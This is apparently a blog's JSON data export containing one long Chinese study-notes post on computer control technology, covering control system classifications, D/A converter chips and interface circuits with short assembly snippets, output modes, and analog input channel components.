{"meta":{"title":"Mike Taylor","subtitle":"ZJL","description":"无聊的人生只剩下无尽的空虚。","author":"Mike Taylor","url":"https://github.com/zhangjialin996/zhangjialin996.github.io","root":"/"},"pages":[{"title":"about","date":"2021-09-12T04:14:58.000Z","updated":"2021-09-12T04:15:27.026Z","comments":false,"path":"about/index.html","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"计算机控制技术及工程应用","slug":"计算机控制技术及工程应用","date":"2021-11-22T07:42:17.000Z","updated":"2021-11-30T13:33:20.700Z","comments":true,"path":"2021/11/22/计算机控制技术及工程应用/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%8E%A7%E5%88%B6%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%B7%A5%E7%A8%8B%E5%BA%94%E7%94%A8/","excerpt":"","text":"《计算机控制技术及工程应用（第三版）-林敏》 教师：电子科技大学 吴正华 第1章计算机控制概述考察方式不会出大题，主要就是选题，结合第11 12 13 14章，重点是了解概念。 要点： 计算机控制系统组成 计算机控制系统分类 计算机控制系统种类 计算机控制技术及工程应用是把计算机技术与自动化控制系统融为一体的一门综合性学科。从计算机应用角度出发，自动化控制工程是其最重要的一个应用领域；而从自动化控制工程来看，计算机技术又是一个主要的实现手段。 用于自动化控制的计算机统称为工业控制计算机，它与用于计算及数据处理的商务计算机是两类不同用途，不同结构的计算机。 本书立足于工业自动化领域，讨论这种不同于普通计算机的计算机控制系统的结构组成、相关技术及其工程应用。 1.1 控制系统组成1.1.1 控制系统概念计算机控制系统是由常规仪表控制系统演变而来，常规仪表组成的自动控制系统根据不同的控制要求，一般分为：闭环控制和开环控制。 闭环控制系统：测量变送器对被控对象进行检测，把被控量（如：温度、压力等物理量）转换为电信号，再反馈到控制器中，控制器将此测量值与设定值进行对比，形成偏差输入，并按照一定的控制规律产生相应的控制信号驱动执行器工作，执行器产生的操纵变量使被控对象的被控量跟踪值趋近于设定值，从而实现自动控制稳定生产的目的。这种信号传递形成了闭合回路，所以称之为按偏差进行控制的闭环反馈控制系统。 开环控制系统：控制器直接根据设定值驱动执行器去操控对象，信号传递是单方向的，也称程序（顺序）控制系统。显然，开环控制系统不能自动消除被控量与设定值之间的偏差，控制性能也不如闭环控制系统。 大多数控制系统均采用闭环控制系统，通常意义下的自动控制系统也是闭环控制系统。 将控制器用控制计算机（微型计算机、A/D（模/数）转换器接口、D/A（数/模）转换器接口）代替。由于计算机采用的是数字信号传递，而一次仪表多采用模拟信号传递，因此需要有A/D转换器将模拟量转换为数字量输入；需要有D/A转换器将数字量转换为模拟量输出。 计算机控制系统的监控过程： 实时数据采集：对来自测量变送器的被控量的瞬时值进行采集和输入。 实时数据处理：对采集到的被控量进行分析、比较和处理，按一定的控制规律运算，进行控制决策。 实时输出控制：根据控制决策，适时地对执行器发出控制信号，完成监控任务。 “实时”：信号的输入、运算处理和输出能在一定时间内完成，超过这个时间，就会失去控制时机。 完整的计算机控制系统是由硬件和软件两大部分组成。 1.1.2 硬件组成计算机控制系统一般由主机、常规外部设备、过程输入/输出（I/O）通道、操作台和通信设备等组成。 主机：由CPU、RAM（随机存储器）、ROM（只读存储器）和系统总线构成的主机是控制系统的指挥部。主机所产生的各种控制是按照人们事先安排好的程序进行的。 常规外部设备：实现主机和外界信息交换功能的设备被称为常规外部设备，简称外设。由输入设备、输出设备、外存储器等组成。 常规外部设备 + 主机组成的计算机基本系统，即通常说的普通计算机。 过程输入/输出通道：在计算机与生产过程被控对象之间起着信息传递和变换的作用的连接装置。 过程输入通道分为数字量输入通道（DI通道，用于输入开关量信号或数字信号量）和模拟量输入通道（A/D或AI通道，用于将模拟量输入信号转换为数字信号）两种。 过程输出通道分为数字量输出通道（DO通道，用于输出开关量信号或数字信号量）和模拟量输出通道（D/A或AO通道，用于将数字信号转换为模拟信号）两种。 操作台：操作员和计算机控制系统之间进行联系的纽带，可以完成计算机输入程序、修改数据、显示参数、发出各种操作指令等功能。 操作员分为系统操作员和生产操作员两种。系统操作员和生产操作员的操作设备一般是分开的。 通信设备：连接网络，进行信息交互。 1.1.3 软件组成软件：完成各种功能的计算机程序的总和，是计算机控制系统神经中枢。 软件通常分为：系统软件、应用软件两大类。 系统软件：面向计算机硬件系统本身的软件，可以解决普遍性问题。 操作系统是系统软件的核心，提供软件开发环境，和运行环境 语言处理程序：将人们编写的源程序转换成计算机能识别并执行的程序 数据库管理系统：有效实现数据信息的存储、更新、查询、检索、通信控制等 实用工具软件：用于对程序进行编辑、装配链接、调试以及对系统程序进行监控等。 应用软件：面向特定问题的软件，可解决特殊性问题，是在系统软件的支持下运行。 过程监视程序 过程控制计算程序 公共服务程序 当前，最流行的设计方法之一，是采用VB作为平台和数据库管理、VC作为面向对象程序、汇编作为I/O接口处理的编程方式。 1.2 控制系统分类1.2.1 数据采集系统DAS计算机应用于生产过程控制最早、也是最基本的一种类型。 对于指导生产以及建立或改善生产过程的数学模型，是有着重要作用的，它是所有计算机控制系统的基础。 1.2.2 操作指导控制系统OGC基于数据采集系统的一种开环结构。 计算机根据采集到的数据以及工艺要求进行优化计算，计算出最优操作条件，并不直接输出控制被控对象，而是显示打印出来，操作人员据此去改变各个控制器的设定值或操作执行器，达到操作知道的作用。相当于模拟仪表控制系统的设定值或操作指导的作用。 OGC系统优点：结构简单，控制灵活和安全。 缺点：要由人工操作，速度受到限制，不能同时控制多个回路。常用于计算机控制系统设置的初级阶段，或用于试验新的数学模型、调试新的控制程序等场合。 1.2.3 直接数字控制系统DDC DDC系统用一台计算机即可完成对多个被控对象的数据采集，而且能按一定的控制规律进行实时决策，并通过过程输出通道发出控制信号，实现对生产过程的闭环控制。 DDC系统以其可靠性高，功能完善、灵活性大而成为计算机在工业生产过程中最典型的一种应用方式。 1.2.4 监督计算机控制系统SCCSCC系统是OGC系统和常规仪表控制系统或DDC系统综合而成的两级系统。 计算机设定值控制系统SPC：SCC+模拟控制器系统 SCC+DDC控制系统，作为上位机的SCC计算机按照描述生产过程的数学模型，根据原始工艺数据与实时采集的现场变量计算出最佳动态设定值，送给作为下位机的控制器或DDC计算机，由下位机控制生产过程。这样系统可以根据生产工况变化，不断地修正设定值，使生产过程始终处于最优工况，属于计算机在线最优控制的一种形式。 当上位机出故障时，可由下位机独立完成控制。下位机直接参与生产过程控制，要求其实时性好、可靠性高和抗干扰能力强；而上位承担高级控制与管理任务，应配置数据处理能力强，存储容量大的高档计算机。 1.2.5 分散控制系统DCSDCS以微处理器为基础，借助计算机网络对生产过程进行集中式呵呵分散式控制的先进计算机控制系统，是”4C”技术的结晶。 既不同于分散的仪表控制系统，也不同于集中式的计算机控制系统，而是在吸收了两者的优点基础上发展起来的具有崭新结构体系和独特技术风格的新型自动化系统。 1.2.6 现场总线控制系统FCS改进了DCS成本高和由于各个厂商的产品通信标准不统一而造成的不能互联等弱点，采用集管理、控制功能于一体的工作站与现场总线智能仪表的二层结构模式，把原DCS控制站的功能分散到智能型现场仪表中去。每个现场仪表（如：变送器、执行器）都作为一个智能结点，都带CPU单元，可以分别独立完成测量、校正、调节、诊断等功能，靠网络协议把它们连接在一起统筹工作。这种彻底的分散控制模式使系统更加可靠。 FCS的核心是现场总线，将当今的网络通信与管理概念引入工业控制领域。现场总线本质上是一种数字通信协议，是连接智能现场设备和自动化系统的数字式、双向传输、多分支结构的串行通信网络。FCS代表了今后工业控制体系结构发展的一种方向。 1.2.7 计算机集成制造系统CIMSCIMS采用多任务分层体系结构，现在已经形成多种方案。流程工业CIMS的递阶层次结构：（从下至上）控制层、监控层、调度层、管理层、决策层。 1.3 控制装置的类型1.3.1 可编程控制器PLc计算机与继电逻辑控制概念相结合的产物，其低端为常规继电逻辑控制的替代装置，而高端为一种高性能的工业计算机。主要由：CPU、存储器、输入组件、输出组件、电源、编程器等组成。 PLC具有系统构成灵活、易扩展、编程简单、调试容易、抗干扰能力强的优点，不仅在顺序程序控制领域中具有优势，而且在运动控制、过程控制、网络通信领域方面也毫不逊色。 1.3.2 可编程调节器主要由微处理单元，过程I/O单元、面板单元、通信单元、硬手操单元等组成，实际是一种仪表化的微型控制计算机。 可编程调节器不仅可以作为大型分散控制系统中最基本的单元，而且也可以在一些重要场合下单独构成复杂的控制系统，完成1个~4个控制回路。 特别适用于连续过程模拟量信号的控制系统中。 1.3.3 总线式工控机IPC总线式工控机是基于总线技术和模块化结构的一种专用于工业控制的通用型计算机。 总线式工控机具有小型化、模板化、组合化、标准化的设计特点，能满足不同层次、不同控制对象的需要，又能在恶劣的工业环境中可靠的运行。因此，广泛用于各种控制场合，尤其是十几个到几十个回路中的中等规模的控制系统中。 1.3.4 嵌入式计算机系统嵌入式计算机系统，简称嵌入式系统，以应用为核心，以计算机技术为基础，软件、硬件可以裁剪，适应于应用系统对功能、可靠性、成本、体积、功耗等方面有严格要求的专用计算机。 三大基本要素： 嵌入性 专用性 计算机系统 嵌入式系统可分为系统级、模板级、芯片级。 以单片机为核心的低级嵌入式系统是嵌入式发展的最初阶段。 嵌入式系统进入了以因特网为标志的高级发展阶段。 1.3.5 其他控制装置当前计算机控制技术正在进一步向综合自动化、网络化、智能化、虚拟化、绿色化发展。 思考题 简述计算机控制系统与常规仪表控制系统的基本结构及主要异同点。 分析说明图1-3计算机控制系统的硬件组成及其作用。 计算机控制系统的软件由哪些部分构成。 按控制方案来分，计算机控制系统分为哪几大类。 计算机控制装置可以分为哪几种类型。 第2章 模拟量输出通道引言部分模拟量输出通道的任务：把计算机处理后的数字量信号转换成模拟量电压或电流信号，去驱动相应的执行器，从而达到控制的目的。 模拟量输出通道(称为D/A通道或AO通道）构成：一般是由接口电路、数/模转换器（简称D/A或AO)和电压/电流变换器等。 多D/A结构 一路输出通道使用一个D/A转换器 D/A转换芯片内部一般都带有数据锁存器 D/A转换器具有数字信号转换模拟信号、信号保持作用 优点：结构简单，转换速度快，工作可靠，精度较高、通道独立 缺点：所需要的D/A转换器芯片较多 共享D/A结构 多路输出通道共用一个D/A转换器 每一路通道都配有一个采样保持放大器 D/A转换器只起数字信号到模拟信号的转换作用 采样保持器实现模拟信号保持功能 优点：节省D/A转换器 缺点：电路复杂，精度差，可靠低，占用主机时间（为了使保持信号不至于下降太多需要不断刷新数据而占用主机时间） 总结：现在，随着集成电路D/A转换器芯片价格不断下降，控制系统中的模拟信号输出通道普遍采用多D/A结构形式。 2.1 D/A转换器 分类： 按位数： 8位 10位 12位 按输出形式： 电流输出型 电压输出型 满足特殊需求的D/A转换器 2.1.1 工作原理与性能指标1.D/A转换器的工作原理 以4位D/A转换器为例： D/A转换器主要由基准电压VREF、R-2R T型电阻网络、位切换开关BSi和运算放大器A四部分构成。 基准电压VREF由外部稳压电源提供，位切换开关BS3~BS0分别接受要转换的二进制数D3~D0的控制，当某一位Di = 1，则相应开关BSi切换到“1”端（虚地），就会把基准电压VREF加在该分支电阻2R上的电流Ii切换到放大器的反相端，此电流经反馈电阻Rfb直至输出端，从而把Di = 1转换成相应的模拟电压VOUT输出；而当Di = 0时，BSi切换到“0”端（地），则电流Ii切换到放大器的正相端流入地中而对放大器输出不起作用。 由于T型电阻网络中各个节点向右看地等效电阻均为2R，因此各2R支路上的电流就按1/2系数进行分配，即：在各2R支路上产生与二进制数各位的权成比例的电流，并经运算放大器A相加，从而输出成比例关系的模拟电压VOUT。 2.D/A转换器性能指标衡量芯片质量的重要参数，也是选取D/A芯片型号的依据。 分辨率 指D/A转换器能分辨的最小输出模拟增量，即当输入数字发生单位数码变化时所对应输出模拟量的变化量，它取决于能转换的二进制位数，数字量位数越多，分辨率也就越高。其分辨率与二进制位数n呈以下关系：$$分辨率 = \\frac{1}{2^n - 1} \\分辨力 = \\frac{电压满量程}{2^n - 1}$$ 转换精度 指转换所得的实际值和理论值的接近程度，它可以用绝对误差和相对误差来表示。 与分辨率时两个不同的概念。对于分辨率很高的D/A转换器，有可能由于温度漂移、线性度差等原因并不具有很高的精度。 例如：满量程时的理论输出值为10V，实际输出值为9.99V~10.01V之间，其转换精度为±10mV。 对于分辨率很高的D/A转换器并不一定具有很高的精度。 偏移量误差 指输入数字量时，输出模拟量对于零的偏移值。此误差可通过D/A转换器外接的VREF和电位器加以调整。 稳定时间 描述D/A转换速度快慢的一个参数，指从输入数字量到输出模拟量达到终值误差1/2LSB（对应于满量程输出的1/（2^n - 1）)所需的时间。 显然，稳定时间越大，转换速度越低。对于输出是电流的D/A转换器来说，稳定时间是很快的，约几微秒，而输出是电压的D/A转换器，其稳定时间主要取决于运算放大器的响应时间。 2.1.2 8位DAC0832芯片 性能： 一个8位D/A转换器 电流输出方式 稳定时间为1us 采用20脚双立直插式封装 同系列芯片还有DAC0830、DAC0831 工作原理 DAC0832主要由8位输入寄存器、8位DAC寄存器、8位D/A转换器以及输入控制电路四部分组成。 8位输入寄存器：用于存放主机送来的数字量，使输入数字量得到缓冲和锁存，由LE1(上划线)加以控制 8位DAC寄存器：用于存放待转换的数字量，由LE2(上划线)加以控制 8位D/A转换器：输出与数字量成正比的模拟电流 输入控制电路：由与门、非与门组成，控制两个寄存器的选通锁或锁存状态 各引脚功能： DI0~DI7：数据输入线，其中DI0为最低有效位LSB，I7为 最高有效位MSB。 $$\\overline{CS}$$ 片选信号，输入线，低电平有效。 $$\\overline{WR_1}$$ 写信号1，输入线，低电平有效。 ILE 输入允许锁存信号，输入线，高电平有效。 当ILE、CS(上划线)和WR1(上划线)同时有效，8位输入寄存器端为高电平”1“，此时寄存器的输入端Q跟随输入端D的电平变化；反之，当端为低电平”0“时，原D端输入数据被锁存于Q端，在此期间，D端电平的变化不影响Q端。 $$\\overline{XFER}$$ 传送控制信号，输入线，低电平有效。 当WR2(上划线)和XFER(上划线)同时有效时，8位DAC寄存器端为高电平”1“，此时DAC寄存器的输入端Q跟随输入端D也就是输入寄存器Q端的电平变化；反之，当端为低电平”0“时，第一级8位输入寄存器Q的状态则锁存到第二级8位DAC寄存器中，以便第三级8位DAC转换器进行D/A转换。 IOUT1 DAC电流输入端1，一般作为运算放大器差动输入信号之一。 IOUT2 DAC电流输入2，一般作为运算放大器另一个差动输入信号。 Rfb 固化在芯片内的反馈电阻连接端，用于连接运算放大器的输入端 VREF 基准电压源端，输入线，-10VDC ~ + 10 VDC VC 工作电压源端，输入线，+ 5VDC ~ +15VDC AGND和DGND：模拟电路地与数字电路地，一般情况下，这两种地最后总有一点接在一起，以便提高抗干扰能力。 2.1.3 12位DAC1210芯片为了提高分辨率产生 是一个12位D/A转换器，电流输出方式，其结构原理与控制信号功能基本类似于DAC0832。由于它比DAC0832多了4条数据输入线，故有24条引脚。 DAC1210内部有三个寄存器： 一个位输入寄存器，用于存放12位数字量中的高8位DI11~DI4，一个4位输入寄存器，用于存放12位数字量中的低4位DI3~DI0 一个12位DAC寄存器，存放上述两个输入寄存器送来的12位数字量 12位D/A转换器用于完成12位数字量的转换。 由与门、非与门组成的输入控制电路来控制3个寄存器的选通或锁存状态。其中引脚（片选信号、低电平有效）、（写信号、低电平有效）和BYTE1/BYTE2(上划线)（字节控制信号）的组合，用来控制8位输入寄存器和4位输入寄存器。 当CS(上划线)、WR1(上划线)为低电平”0“，BYTE1/BYTE2(上划线)为高电平”1“时，与门的输出LE1(上划线)、LE2(上划线)为”1“，选通8位和4位两个输入寄存器，将要转换的12位数据全部送入寄存器 当BYTE1/BYTE2(上划线)为低电平”0”时，LE1为”0”，8位输入寄存器锁存刚传送的8位数据，而LE2仍为”1“，4位输入寄存器仍为选通，新的低4位数据将刷新刚传送的4位数据。 因此，在与计算机接口电路中，计算机必须先送高8位后送低4位！！！ XFER(上划线)（传送控制信号、低电平有效）和WR2(上划线)（写信号、低电平有效）用来控制12位DAC寄存器，当它们都为低电平”0“时，与门输出LE3为”1”，12位数据全部送入DAC寄存器；当它们中有一个为高电平”1“时，与门输出LE3即为”0“，则12位DAC寄存器锁存住数据，使12位D/A转换器开始数模转换。 2.2 接口电路为使主机能向D/A转换器传输数据，必须在两者之间设置接口电路。 接口电路功能：进行地址译码、产生片选信号或写信号。 2.2.1 DAC0832接口电路 由于DAC0832内部有输入寄存器，所以它的数据总线可直接与主机的数据总线相连，所以它的数据总线可直接与主机的数据总线相连。 图为DAC0832与PC总线的单缓冲接口电路，它是由DAC0832转换芯片、运算放大器以及74LS138译码器和门电路构成的地址译码电路组成。 图中DAC0832内的DAC寄存器控制端的WR2(上划线)和XFER(上划线)直接接地，使DAC寄存器的输入到输出始终直通；而输入寄存器的控制端分别受地址译码器信号与输入输出指令控制，即PC的地址线A9~A0经138译码器和门电路产生接口地址信号作为DAC0832的片选信号，输入输出写信号IOW(上划线)作为DAC0832的写信号WR1(上划线)。 当需要进行D/A转换时，把被转换的数据如DATA送进累加器AL，入口地址如220H送入DX，然后执行一条OUT输出指令，则CS(上划线)和WR1(上划线)（IOW(上划线)）同为低电平，则LE1为”1“，此时主机输出的数据写入DAC0832内的8位输入寄存器，再直通送入D/A转换器进行转换，当IOW(上划线)恢复为高电平时，使D/A转换的输出也保持不变。 程序接口： 123MOV DX,220HMOV AL,[DATA]OUT DX,AL 2.2.2 DAC1210接口电路 DAC内部也有输入寄存器，但用PC中8位数据总线与12位D/A转换器组成接口电路时，需要对数据总线采用复用形式。 上图是12位D/A转换器DAC1210转换芯片、运算放大器以及地址译码电路组成。与8位DAC0832接口电路不同的是，除了数据总线D7~D0与DAC高8位DI11~DI4直接相连以外，D3~D0还要与DAC1210低4位DI3~DI0复用，因而控制电路也略为复杂。 图中，CS(上划线)、WR1(上划线)和BYTE1/BYTE2(上划线)组合，用来依次控制8位输入寄存器（LE1(上划线)）和4位输入寄存器（LE2(上划线)）的选通与锁存；WR2(上划线)和XFER(上划线)用来控制DAC寄存器（LE3(上划线)）的选通与锁存；IOW(上划线)与WR1~WR2连接，用来在执行输出指令时获得低电平(有效)，译码器的两条输出线Y0(上划线)\\、Y2(上划线)分别连接到CS(上划线)~XFER(上划线)，一条地址线A0连接到BYTE1/BYTE2(上划线)，从而形成三个口地址：低4位输入寄存器为380H；高8位输入寄存器为381H;12位DAC寄存器为384H。 在软件设计中，为了实现8位数据线D0~D7传送12位被转换数，主机须分两次传送被转换数。首先将被转换数的高8位传送给8位输入寄存器DI11~DI4，再将低4位传给4位输入寄存器DI3~DI0，然后再打开DAC寄存器，把12位数据送到12位D/A转换器去转换。当输出指令执行完成后，DAC寄存器又自动处于锁存状态以保持D/A转换器的输出不变。设12位被转换数的高8位存放在DATA单元中，低4位存放在DATA+1单元中。 1234567DAC:MOV DX,0381H # 高8位 MOV AL,[DATA] OUT DX,AL MOV DX,[DATA+1] # 低4位 OUT DX,AL MOV DX,0384H OUT DX,AL # 完成12位数据转换 2.3 输出方式多数D/A转换芯片输出的是弱电流信号，要驱动后面的自动化装置，需要在电流输出端外接运算放大器。 2.3.1 电压输出方式由于系统要求不同，电压输出方式又分为单极性输出和双极性输出两种形式。 DAC单极性输出 DAC双极性输出 2.3.2 电流输出方式因为电流信号易于远距离传送，且不易受干扰，特别是在过程控制系统中，自动化仪表只接收电流信号，所以在微机控制输出通道中常以电流信号来传送信息，这就需要将电压信号再转换成电流信号，完成电流输出方式的电路被称为V/I变换电路。电流输出方式一般有两种形式： 普通运算V/I变换电路 集成转换器V/I变换电路（高精度） 普通运算V/I变换电路 集成转换器V/I变换电路 2.3.3 自动/手动输出方式在计算机过程控制中，除了正常运行的自动控制方式以外，在开、停车或事故情况下还需要进行手动控制方式，在自动/手动控制方式切换的瞬间，必须保持系统输出信号不变，才能对执行器的现有位置不产生扰动，即达到双向切换时平衡对位的无扰动切换。 在普通运算放大器V/I变换电路的基础上，增加了自、手动切换开关K1、K2、K3和手动增减电路与输出跟踪电路。 自动/手动状态下的V/I变换 当开关处于自动（A）状态时，运算放大器A2与A1接通，形成一个电压比较型跟随器。当Vf≠Vi时，电路能自动地使输出电流增大或减小，最终使Vf=Vi，于是有：$$I_L = V_i / (R_9 + R_P)$$可以看出：只要电阻R9、RP稳定性好，A1、A2具有较好的增益，该电路就有较高的线性精度。当R9+RP = 500Ω或250Ω时，输出电流IL就以0mA~10mA或4mA~20mA的直流信号线性地对应Vi的0V~5V或1V~5V的直流电压信号。 当开关处于手动（H）状态时，此时运放A1与A2断开，成为一个保持型反相积分器。当按下“增”按钮时，V2以一定的速率上升，从而使IL也以同样的速率上升；当按下“减”按钮时，V2以一定的速率下降，IL也以同样的速率下降。负载RL（一般为电动调节阀）上的电流IL的升降速率取决于R6、R7、C和电源电压±E的大小，而手动操作按钮的时间长短决定输出电流IL的大小。 自动/手动双向无扰动切换 自动到手动的切换：当开关S1、S2、S3都从自动（A）切换为手动（H），“增”、“减”两处按钮处于断开状态，运算放大器A2为一高输入阻抗保持器，则A2的输出V2几乎保持不变，从而维持输出电流IL恒定。因此，自动到手动的无扰动切换是由手动操作电路的硬件实现的。 手动到自动的切换：当开关S1、S2、S3手动（H）切换为自动（A）时，要做到无扰动切换必须使自动输出电路具有跟踪手动输出的功能，即在手动状态下，使来自计算机D/A转换电路的自动输入信号Vi始终等于反映手动输出的信号Vf（Vf和IL总是一一对应的）。要达到这个目的，必须有上图所示的硬件电路与相应的跟踪程序配合。 工作过程：在每个控制周期，计算机首先由数字量输入通道（DI）读入开关S2的状态，以判断输出电路是处于手动状态还是自动状态：若是自动状态，则程序执行本回路预先规定的控制运算，输出Vi并通过V/I变换输出电流IL；若为手动状态，则首先由A/D通道读入Vf并转换为数字信号，然后原封不动地将此数字信号送出，由D/A转换为电压信号送至输出电路的输入端Vi，这样就使Vi始终与Vf相等。当开关S1从手动（H）切换为自动（A）是，由于Vi≡Vf，所以V2与IL都保持不变，从而实现了手动到自动的无扰动切换。 2.4 D/A转换模板将上述D/A转换器芯片及其接口以及输出电路组合集成在一块模板上，就构成了计算机控制系统中的D/A转换模板。 2.4.1 D/A转换模板的通用性 符合总线标准 指计算机内部的总线结构，D/A转换模板及其他所有电路模板都应符合统一的总线标准。 接口地址可选 一套控制系统往往需要配置多块功能模板，或者同一功能模板可能被组合在不同系统中。因此，每块模板应具有接口地址的可选性。 一般接口地址可由基址（或称板址）和片址（或称口地址）组成。 上图为一种可选的译码电路，8位量值比较器74LS688、地址A3~A7、置位开关S与上拉电阻组成基址译码电路，74LS138译码器、地址A0A2构成片址译码电路。只有当Pi = Qi(i = 1,2,3……7)时，它的输出端P = Q为有效低电位从而使74LS138译码器处于工作状态，产生由相应片址A0\\A2确定的片选信号WC0~WC7，该片选信号可分别作为多D/A结构中8个D/A转换器的片选信号CS(下划线)或写信号WR1(下划线)。 而基址A7~A3的确定，完全取决于置位开关S7~S3的通断状态，其基址可在00000xxx~11111xxx范围内任意选定。上图中，S7、S6闭合，S5、S4、S3断开，即确定该板的基址为00111xxx，则该板8个片址最终确定了8个D/A通道的口地址为00111000~00111111，即：38H~3FH 输出方式可选 为了适应不同控制系统对执行器的不同需求，D/A转换模板往往把各种电压输出和电流输出方式组合在一起，然后通过短接柱来选定某一种输出方式。 一个实际的D/A转换模板，供用户选择的输出范围常常是：0~5V、0~10V、±5V、0~10mA、4~20mA等。 2.4.2 D/A转换模板的设计举例D/A 转换模板设计主要考虑以下几点： 安全可靠 尽量选用性能好的元器件，并采用光电隔离技术。 性能/性价比高 既要在性能上达到预定的技术指标，又要在技术路线、芯片元件上降低成本。 通用性 D/A转换模板应符合总线标准，其接口地 址及输出方式应具备可选性。 D/A模板转换设计步骤： 确定性能指标 设计电路原理图 设计和制造印制线路板 最后焊接和调试电路板 图2-15给出了8路8位D/A转换模板的结构组成框图，它是按照总线接口逻辑、I/O功能逻辑和I/O电气接口等三部分布局电子元器件的。图中，总线接口逻辑部分主要由数据缓冲与地址译码电路组成，完成8路通道的分别选通与数据传送（参见图2-14接口地址可选的译码电路）；I/O功能逻辑部分由8片DAC0832组成，完成数模转换（参见图2-5DAC0832接口电路）；而I/O电气接口部分由运算放大器与V/I变换电路组成，实现电压或电流信号的输出（参见图 2-8的双极性电压输出方式与图2-9的电流输出方式）。 考试要求掌握DA原理 判断 简答 DA转换器的性能指标DA大题 电路分析（8位/12位）地址分析 根据需要设计电路 输出方式：重点掌握自动手动输出切换 电路分析不考察 课后习题1、画图说明模拟量输出通道的功能、各组成部分及其作用。 2、D/A转换器的性能指标有哪些？ 3、结合图2-3，分析说明DAC0832的内部结构组成及其作用。 4、结合图2-5分析说明由DAC0832组成的单缓冲接口电路的工作过程，编写完成一次D/A转换的接口程序。 5、结合图2-6分析说明由DAC1210组成的接口电路的工作过程，编写完成一次D/A转换的接口程序。 6、简单说明D/A转换输出电路有几种输出方式。 7、结合图2-13分析说明自动/手动双向无扰动切换过程。 8、结合图2-14分析说明基址与片址的译码过程。 9、结合图2-15分析说明D/A转换模板的结构组成及各部分逻辑功能。 第3章 模拟量输入通道引言部分本章要点： 1．模拟量输入通道的结构组成。 2．多路开关，前置放大、采样保持等各环节的功能作用。 3．8位A/D转换器ADC0809芯片及其接口电路。 4．12位A/D转换器AD574A芯片及其接口电路。 模拟量输入通道的任务：将被控对象的过程参数如温度、压力、流量、液体、重量等模拟量转换成计算机可以接收的数字量信号。 来自于工业现场传感器或变送器的多个模拟信号量首先需要进行信号调理，然后经多路模拟开关，分时切换到后级进行前置放大、采样保持和A/D转换，通过接口电路以数字信号量进入主机系统，从而完成对过程参数的巡回检测任务。 显然，该通道的核心是A/D转换器，通常把模拟信号量输入通道称为A/D通道或AI通道。 3.1 信号调理电路(不考大题)在模拟输入通道中，对现场可能引入的各种干扰，必须采取相应的技术措施以保证A/D转换的精度，所以首先要在输入通道之前设置输入信号调理电路。 根据通道需要，可以采取不同的信号调理技术，如：信号滤波、光电隔离、电平转换、过电压保护、反电压保护、电流/电压变换等。 在控制系统中，对被控量的检测往往采用各种类型的测量变送器，当它们的输出信号为0 - 10 mA或4 -20 mA的电流信号时，一般是采用电阻分压法把现场传送来的电流信号转换为电压信号，以下是两种变换电路： 无源I/V变换 构成：无源器件电阻＋（RC滤波＋二极管限幅）等保护 取值: 输入0- 10 mA，输出为0 -5 V ，R1=100Ω，R2=500Ω； 输入4 -20 mA，输出为1 - 5 V，R1=100Ω，R2=250Ω； 有源I/V变换 构成：有源器件运算放大器＋电阻、电容组成 利用同相放大电路，把电阻R1上的输入电压变成标准输出电压，该同相放大电路的放大倍数： 取值： R1=200Ω，R3=100kΩ，R4=150kΩ 输入0 ~ 10 mA输出0 ~ 5 V R1=200Ω，R3=100kΩ，R4=25kΩ 输入4 ~ 20 mA输出1 ~ 5 V 3.2 多路模拟开关由于计算机工作速度远远快于被测参数的变化，因此一台计算机系统可供几十个检测回路使用，但计算机在某一时刻只能接收一个回路信号。因此，必须通过多路模拟开关实现多选1的操作，将多路输入信号依次切换到后级。 目前计算机控制系统使用的多路开关种类很多，并具有不同的功能和用途。如：集成电路芯片CD4051(双向、单端、8路)、CD4052(单向、双端、4路)、AD7506(单向、单端、16路)等。 双向：该芯片既可以实现多到一的切换，也可以完成一到多的切换；而单向则只能完成多到一的切换。 双端：指芯片内的一对开关同时动作，从而完成差动输入信号的切换，以满足抑制共模干扰的需要。 3.2.1 结构原理 8路模拟开关 构成：电平转换、译码驱动、开关电路 当禁止端INH(上划线)为“1”时，前后级通道断开，即：S0~S7端不可能接通；当INH(上划线)为“0”时，则通道可以被接通，通过改变控制输入端C、B、A的数值，就可以选通8个通道S0~S7中的一路。比如：当CBA = 000时，通道S0选通；CBA = 001时，通道S1选通；……；当CBA = 111，通道S7选通。 见书3-1真值表 3.2.2 扩展电路当采样通道多至16路，可直接选用16路模拟开关的芯片，也可以将2个8路CD4051并联起来，组成一个单端16路开关。 例：试用两个CD4051扩展成一个1x16路的模拟开关。 数据总线D3~D0作为通道选择信号，D3用来控制两个多路开关的禁止端INH(下划线)。当D3 = 0时，选中上面的多路开关，当D2、D1、D0从000变为111时，依次选通S0~S7通道；当D3 = 1，经反相器变成低电平，选中下面的多路开关，此时当D2、D1、D0从000变为111，则依次选通S8~S15通道。 3.3前置放大器引言前置放大器的任务：将输入模拟小信号放大到A/D转换的量程范围 ，如0-5VDC; 对于单纯的微弱信号，可以用一个运算放大器进行单端同相放大或单端反向。 下图(a)，信号源的一端若接放大器的正端，则为同相放大，同相放大倍数G = 1 + R2 / R1。 下图(b)，信号源的一端接放大器的负端，则为反相放大，反相放大电路的放大倍数G = -R2 / R1 当然，这两种电路都是单端放大，所以信号源的另一端是与放大器的另一个输入端共地。 3.3.1 测量放大器来自生产现场的传感器信号往往带有共模干扰，而单个运算放大器的差动输入端难以起到很好的抑制作用。因此，A/D通道中的前置放大器常采用由一组运算放大器构成的测量放大器，也称仪表放大器，如下图。 经典的测量放大器由三个运算放大器组成对称结构，测量放大器的差动输入端VIN+和VIN-分别是两个运算放大器A1、A2的同相输入端，输入阻抗很高，而且完全对称地直接与被测信号相连，因而有极强的抑制共模干扰能力。 增益公式： 3.3.2 可变增益放大器在A/D转换通道中，多路被测信号经常共用一个测量放大器，而各路的输入信号大小往往不同，但都要放大到A/D转换器的同一量程范围。因此对于不同大小的输入信号，测量放大器的增益也应不相同。具有这种性能的放大器称为可变增益放大器或可编程放大器，如下图。 把(a)图中的外接电阻换成一组精密的电阻网络，每个电阻支路上有一个开关，通过支路开关依次通断就可以改变放大器的增益，根据开关支路上的电阻值与增益公式，就可以算得支路开关自上而下闭合时的放大器增益分别为2、4、8、16、32、64、128、256倍。显然这组开关如果用多路模拟开关就可以方便地进行增益可变地计算机数字程序控制，此类集成电路芯片有AD612/AD614等。 另外，还可以用数字电位器代替增益电阻，同样通过编程控制电位器阻值，使其放大倍数接近连续化。此类集成芯片有X9313、X9511、MAX5161。 